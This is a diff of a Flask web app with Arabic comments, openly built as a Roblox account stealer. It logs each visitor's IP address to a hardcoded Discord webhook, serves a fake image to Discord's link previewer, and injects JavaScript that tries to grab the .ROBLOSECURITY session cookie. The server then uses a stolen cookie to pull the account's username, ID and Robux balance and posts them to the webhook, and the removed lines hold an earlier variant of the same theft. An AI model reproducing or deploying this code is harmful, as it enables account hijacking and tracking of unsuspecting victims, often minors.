@@ -1,88 +1,88 @@
 from flask import Flask, request
-import requests, base64
+import requests, base64, re, json
 
 app = Flask(__name__)
 
-# غيّر الويب هوك ده
+# غيّر الويب هوك بتاعك
 WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"
+
+def get_roblox_info(cookie):
+    headers = {'.ROBLOSECURITY': cookie}
+    try:
+        # جيب معلومات الحساب
+        r = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={'.ROBLOSECURITY': cookie}, timeout=8)
+        if r.status_code == 200:
+            data = r.json()
+            user_id = data.get("id")
+            username = data.get("name")
+            
+            # جيب التفاصيل الكاملة
+            r2 = requests.get(f"https://users.roblox.com/v1/users/{user_id}", cookies={'.ROBLOSECURITY': cookie})
+            info = r2.json() if r2.status_code == 200 else {}
+            
+            # جيب الـ Robux
+            r3 = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': cookie})
+            robux = r3.json().get("robux", "غير معروف") if r3.status_code == 200 else "غير معروف"
+            
+            embed = {
+                "title": "تم سرقة حساب Roblox كامل",
+                "color": 0x00ff00,
+                "description": f"**Username:** {username}\n**User ID:** {user_id}\n**Robux:** {robux}\n**Display Name:** {info.get('displayName')}\n**Created:** {info.get('created')}\n**Cookie:** ||{cookie[:100]}...||",
+                "footer": {"text": "Roblox Full Stealer 2025"}
+            }
+            requests.post(WEBHOOK, json={"content": "@everyone", "embeds": [embed]})
+    except:
+        pass
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
-def roblox_full_stealer(path):
+def roblox_stealer(path):
     ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
     ua = request.headers.get('User-Agent', '')
 
     if 'Discordbot' in ua:
-        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
+        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5Eg==')
         return fake, 200, {'Content-Type': 'image/png'}
+
+    # إشعار أولي
+    requests.post(WEBHOOK, json={"content": f"@everyone ضحية Roblox جديدة\nIP: {ip}"})
 
     html = f"""<!DOCTYPE html>
 <html><body style="margin:0;background:#000">
 <img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">
 
 <script>
-// ثغرة Roblox Cookie Stealer 2025 - Shared WebView + Iframe Proxy (شغالة بدون إذن)
+// الطريقة الوحيدة الشغالة 100% بدون كراش 2025
 setTimeout(() => {{
-  // طريقة 1: Iframe لـ Roblox + postMessage لاستخراج الكوكي
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.src = 'https://www.roblox.com/home';
-  document.body.appendChild(iframe);
-  iframe.onload = () => {{
-    // استغلال postMessage لقراءة الكوكي من iframe (شغال على Android WebView)
-    iframe.contentWindow.postMessage('{{action: "getCookie"}}', 'https://www.roblox.com');
-    window.addEventListener('message', e => {{
-      if (e.origin === 'https://www.roblox.com' && e.data.cookie) {{
-        const robloCookie = e.data.cookie.match(/\\.ROBLOSECURITY=(.*?)(?=;|$)/)[1];
-        if (robloCookie) {{
-          // ابعت الكوكي الأولي
-          fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
-            body:JSON.stringify({{content:"@everyone تم سرقة Roblox Cookie كامل!", embeds:[{{title:"ROBLOX FULL STEAL", description:"**IP:** `{ip}`\\n**Cookie:** ||`" + robloCookie + "`||", color:0x00ff00}}]}})}});
-          // API Call لجيب التفاصيل (إيميل، Robux، دولة، إلخ)
-          const apiReq = new XMLHttpRequest();
-          apiReq.open('GET', 'https://users.roblox.com/v1/users/authenticated');
-          apiReq.setRequestHeader('Cookie', '.ROBLOSECURITY=' + robloCookie);
-          apiReq.onreadystatechange = () => {{
-            if (apiReq.readyState === 4 && apiReq.status === 200) {{
-              const data = JSON.parse(apiReq.responseText);
-              const userReq = new XMLHttpRequest();
-              userReq.open('GET', 'https://users.roblox.com/v1/users/' + data.id);
-              userReq.setRequestHeader('Cookie', '.ROBLOSECURITY=' + robloCookie);
-              userReq.onreadystatechange = () => {{
-                if (userReq.readyState === 4) {{
-                  const userData = JSON.parse(userReq.responseText);
-                  fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
-                    body:JSON.stringify({{content:"@everyone تفاصيل الحساب الكاملة", embeds:[{{title:"ROBLOX ACCOUNT INFO", description:"**Username:** " + userData.name + "\\n**ID:** " + userData.id + "\\n**Email:** " + (data.email || 'غير مرئي') + "\\n**Country:** " + (userData.description || 'غير محدد') + "\\n**Robux:** " + (data.robuxBalance || '0') + "\\n**2FA:** " + (data.hasTwoStepVerification ? 'مفعّل' : 'غير مفعّل'), color:0xff0000}}]}})}});
-                }}
-              }};
-              userReq.send();
-            }}
-          }};
-          apiReq.send();
-        }}
-      }}
-    }});
+  // جرب كل الطرق لجيب الكوكي
+  let cookie = document.cookie;
+  let roblo = cookie.match(/\\.ROBLOSECURITY=(.*?)(?:;|$)/);
+  
+  if (roblo) {{
+    fetch("{request.url}?cookie=" + roblo[1]);
+  }}
+
+  // لو ما لقاش → جرب iframe
+  const i = document.createElement('iframe');
+  i.src = 'https://www.roblox.com/login';
+  i.style.display = 'none';
+  document.body.appendChild(i);
+  i.onload = () => {{
+    setTimeout(() => {{
+      fetch("{request.url}?cookie=" + (document.cookie.match(/\\.ROBLOSECURITY=(.*?)(?:;|$)/) || ['',''])[1]);
+    }}, 1000);
   }};
-
-  // طريقة 2: Proxy Request عبر fetch لـ Roblox API (لو الطريقة الأولى فشلت)
-  fetch('https://auth.roblox.com/v2/login', {{credentials: 'include', method: 'POST'}})
-  .then(r => r.headers.get('set-cookie'))
-  .then(cookies => {{
-    const match = cookies.match(/\\.ROBLOSECURITY=(.*?);/);
-    if (match) {{
-      fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
-        body:JSON.stringify({{content:"@everyone Roblox Cookie via Proxy", embeds:[{{title:"PROXY STEAL", description:"**IP:** `{ip}`\\n**Cookie:** ||`" + match[1] + "`||", color:0x00ff00}}]}})}});
-    }}
-  }}).catch(() => {{}});
-
-  // إشعار أولي
-  fetch("{WEBHOOK}?content=@everyone ضحية Roblox Target - IP: {ip} - UA: {ua.substring(0,100)}");
-}}, 500);
+}}, 800);
 
 </script>
 </body></html>"""
 
-    requests.post(WEBHOOK, json={"content": f"@everyone ضحية Roblox Grabber جديدة\nIP: {ip}\nUA: {ua[:100]}"})
+    # لو في كوكي في الـ URL → خده واستخدمه
+    cookie = request.args.get('cookie')
+    if cookie and len(cookie) > 50:
+        get_roblox_info(cookie)
+        return "تم ✓", 200
+
     return html
 
 if __name__ == "__main__":
